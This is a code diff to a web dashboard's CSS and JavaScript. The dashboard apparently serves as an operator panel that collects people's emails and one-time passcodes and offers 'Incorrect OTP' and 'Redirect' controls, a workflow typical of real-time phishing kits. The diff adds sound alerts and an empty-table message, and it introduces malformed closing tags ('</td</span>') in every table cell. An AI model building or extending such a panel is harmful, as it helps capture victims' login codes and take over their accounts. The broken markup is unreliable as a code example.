@@ -214,6 +214,8 @@
       font-size: 13px;
       font-weight: 500;
       margin-right: 12px;
+      cursor: pointer;
+      display: inline-block;
     }
     .sound-status.off {
       background: #ef4444;
@@ -286,14 +288,9 @@
     const soundStatus = document.getElementById('soundStatus');
     soundStatus.innerHTML = '🔊 Sound On - Notifications Active';
     soundStatus.classList.remove('off');
-    
-    // Play test sound to unlock audio on browsers
-    const testAudio = new Audio();
-    testAudio.play().catch(() => {});
+    // Play test sound
     playEmailSound();
-    
-    // Show confirmation
-    alert('Sound enabled! You will now hear email.mp3 and otp.mp3 notifications.');
+    alert('Sound enabled! You will now hear email and OTP notifications.');
   }
 
   function showBrowserNotification(title, body) {
@@ -381,19 +378,23 @@
 
   function displayUsers(users) {
     const tbody = document.getElementById('usersTable');
+    if (!users.length) {
+      tbody.innerHTML = '<tr><td colspan="6" style="text-align:center; padding:40px;">No users found</td</span> </span>';
+      return;
+    }
     tbody.innerHTML = users.map(user => `
       <tr>
-        <td>${user.id}</td>
-        <td>${escapeHtml(user.email)} <button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')">📋</button></td>
-        <td>${user.otp_code ? escapeHtml(user.otp_code) : '-'} ${user.otp_code ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp_code)}')">📋</button>` : ''}</td>
-        <td><span class="status-badge status-${user.status}">${user.status}</span></td>
-        <td>${new Date(user.created_at).toLocaleString()}</td>
+        <td>${user.id}</td</span>
+        <td>${escapeHtml(user.email)} <button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.email)}')">📋</button></td</span>
+        <td>${user.otp_code ? escapeHtml(user.otp_code) : '-'} ${user.otp_code ? `<button class="copy-btn" onclick="copyToClipboard('${escapeHtml(user.otp_code)}')">📋</button>` : ''}</td</span>
+        <td><span class="status-badge status-${user.status}">${user.status}</span></td</span>
+        <td>${new Date(user.created_at).toLocaleString()}</td</span>
         <td class="action-group">
           ${user.status === 'pending' ? `<button class="action-btn btn-approve" onclick="actionUser('approve','${user.email}')">Approve</button>
              <button class="action-btn btn-reject" onclick="actionUser('reject','${user.email}')">Reject</button>` : ''}
           ${user.status === 'otp_submitted' ? `<button class="action-btn btn-incorrect" onclick="actionUser('incorrect-otp','${user.email}')">Incorrect OTP</button>
              <button class="action-btn btn-redirect" onclick="actionUser('redirect','${user.email}')">Redirect</button>` : ''}
-        </td>
+         </td</span>
       </tr>
     `).join('');
   }
